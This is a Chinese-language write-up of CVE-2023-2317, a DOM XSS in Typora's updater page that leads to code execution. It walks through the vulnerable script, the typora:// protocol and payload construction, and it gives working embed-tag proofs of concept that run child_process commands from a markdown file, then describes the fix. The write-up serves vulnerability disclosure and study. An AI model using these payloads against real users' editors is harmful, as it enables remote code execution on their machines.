# Typora命令执行:CVE-2023-2317

# 漏洞信息

漏洞编号：CVE-2023-2317

漏洞范围：Typora，≤1.67

漏洞说明：低于1.67版本的Typora存在代码执行漏洞，通过在标签中加载`typora://app/typemark/updater/update.html`实现在Typora主窗口的上下文中运行任意JavaScript代码。

# 问题代码段

整段代码如下，我们可以逐段进行分析：

    
    
    <script type="text/javascript">
      var curVersion = /[?&]curVersion=([^&]+)/.exec(window.location.search)[1];
      var newVersion = /[?&]newVersion=([^&]+)/.exec(window.location.search)[1];
      var releaseNoteLink = decodeURIComponent(/[?&]releaseNoteLink=([^&]+)/.exec(window.location.search)[1]);
      var hideAutoUpdates = /[?&]hideAutoUpdates=([^&]+)/.exec(window.location.search)[1] == "true";
      var labels = JSON.parse(decodeURIComponent(/[?&]labels=([^&]+)/.exec(window.location.search)[1]));
    
      document.querySelector("#sum").innerText = labels[4] + " " + labels[5].replace("$1", newVersion).replace("$2", curVersion);
      document.querySelectorAll("[data-label]").forEach(function(dom){
        dom.innerHTML = labels[dom.getAttribute("data-label") - 0];
      });
      document.querySelector("#release-panel").src = releaseNoteLink;
    
      var autoUpdateInput = document.querySelector("#preference-enable-auto-update")
      autoUpdateInput.checked = !!isAutoUpdateEnabled;
      autoUpdateInput.onchange = toggleAutoUpdate;
      if(hideAutoUpdates) {
        document.querySelector("#preference-enable-auto-update-wrapper").style.display = "none";
        document.querySelector("#skip-this-version-btn-group").style.display = "none";
      }
    </script>

首先看获取输入部分：

    
    
    var curVersion = /[?&]curVersion=([^&]+)/.exec(window.location.search)[1];
    var newVersion = /[?&]newVersion=([^&]+)/.exec(window.location.search)[1];
    var releaseNoteLink = decodeURIComponent(/[?&]releaseNoteLink=([^&]+)/.exec(window.location.search)[1]);
    var hideAutoUpdates = /[?&]hideAutoUpdates=([^&]+)/.exec(window.location.search)[1] == "true";
    var labels = JSON.parse(decodeURIComponent(/[?&]labels=([^&]+)/.exec(window.location.search)[1]));

通过正则表达式匹配的方式，获取传入的5个GET参数：curVersion、newVersion、releaseNoteLink、hideAutoUpdates和labels。接收参数releaseNoteLink时会对输入做一次URI解码，接收labels参数时会先做一次URI解码，再做一次json解析。

获取输入后，会使用dom.innerText和din.innerHTML替换原页面中的代码，且没经过任何清洗， **也就是这个地方会导致DOM型XSS。**

    
    
    document.querySelector("#sum").innerText = labels[4] + " " + labels[5].replace("$1", newVersion).replace("$2", curVersion);
    document.querySelectorAll("[data-label]").forEach(function(dom){
      dom.innerHTML = labels[dom.getAttribute("data-label") - 0];
    });

代码里有两处替换，第一处将参数`labels[4]`和`labels[5].replace("$1", newVersion).replace("$2",
curVersion)`做拼接，然后直接替换掉页面中的元素`<div class="sum"
id="sum"></div>`。第二处遍历页面中拥有`data-label`属性的元素，然后使用`dom.getAttribute("data-label") - 0`这个trick获得当前遍历的data-label元素索引值，使用参数labels中对应的索引值进行替换。具体的替换点就在同文件内:

![](./img/3103106856143523770.png)

因此，我们分析出传入的参数labels是一个长度至少为5的数组，数组的前3个元素都会未经清洗的替换掉页面中的元素导致DOM型XSS(第4、5个参数使用的时innerText替换，无法利用)，我们只需要在labels前4个元素中填入Payload，就可以实现命令执行。

# 漏洞利用

我们直接打开updater.html，可以看到如下界面：

![](./img/8988543271483329918.png)

可以对比出就是Typora中的“帮助”→”检查更新”界面:

![](./img/2731311924380343698.png)

因此，我们只需要， **让Typora界面加载带有我们的payload访问的updater.html文件** ，就能实现命令执行。

## typora协议

Typora内部实现了`typora://`协议，可以用于Typora访问特定文件。我们在Typora中按下Shift+F12，可以看到Typora页面中使用了这种协议：

![](./img/4180893276731896091.png)

以`<script
src="typora://app/typemark/lib.asar/MathJax3/es5/input/tex/extensions/xypic.js"
charset="UTF-8"></script>`这个访问为例，lib.asar位于Typora安装目录的resources文件夹下，而updater.html位于Typora安装目录的updater文件下，所以使用typora://协议访问updater.html应该这样写:

    
    
    typora://app/typemark/updater/updater.html?a=xxx&b=xxx&c=xxx

再根据前文分析的结果，我们需要传入curVersion、newVersion、releaseNoteLink、hideAutoUpdates和labels五个参数。对参数releaseNoteLink做一次URI解码，参数labels是一个长度至少为5的数组，也需要做一次URI编码，在labels的前3个元素中任选一个填入payload。

## 构建payload

根据常规思路，我们应该require库child_process然后调用exec参数，但是typora内没有定义require函数，而是使用reqnode函数代替:

![](./img/4144966168471164758.png)

因此，Windows环境下的payload可以这样写：

    
    
    reqnode('child_process').exec("calc")

包在svg标签里实现页面加载:

    
    
    <svg/onload=top.eval(`reqnode('child_process').exec('calc')`)></svg>

编码前的Poc:

    
    
    <embed src="typora://app/typemark/updater/updater.html?curVersion=111&newVersion=222&releaseNoteLink=333&hideAutoUpdates=false&labels=["","<svg/onload=top.eval(`reqnode('child_process').exec('calc')`)></svg>","","","",""]">

最后对releaseNoteLink、lables两个参数做URI编码，最终Poc为：

    
    
    <embed src="typora://app/typemark/updater/updater.html?curVersion=a&newVersion=b&releaseNoteLink=c&hideAutoUpdates=false&labels=[%22%22,%22%3Csvg%2Fonload%3Dtop.eval(%60reqnode('child_process').exec('calc')%60)%3E%3C%2Fsvg%3E%22,%22%22,%22%22,%22%22,%22%22]">

为了同时在Windows环境和Linux环境生效，我们可以这么写payload:

    
    
    <svg/onload=top.eval(`reqnode('child_process').exec(({Win32: 'calc', Linux: 'gnome-calculator -e "Typora RCE PoC"'})[navigator.platform.substr(0,5)])`)></svg>

# 漏洞复现

  1. 新建一个md文件，贴入payload：

![](./img/6059514268733447083.png)

  1. 保存后使用Typore打开，成功弹出calc：

![](./img/7646511552465543057.png)

# 漏洞修复

安装最新的1.6.7版本查看其updater.html文件，可以看到已经把innerHTML改成了innerText:

![](./img/4245204739554172191.png)

# 参考链接

<https://mp.weixin.qq.com/s/xj08AP19KyFLYwWtHwmDrQ>

<https://nvd.nist.gov/vuln/detail/CVE-2023-2317>

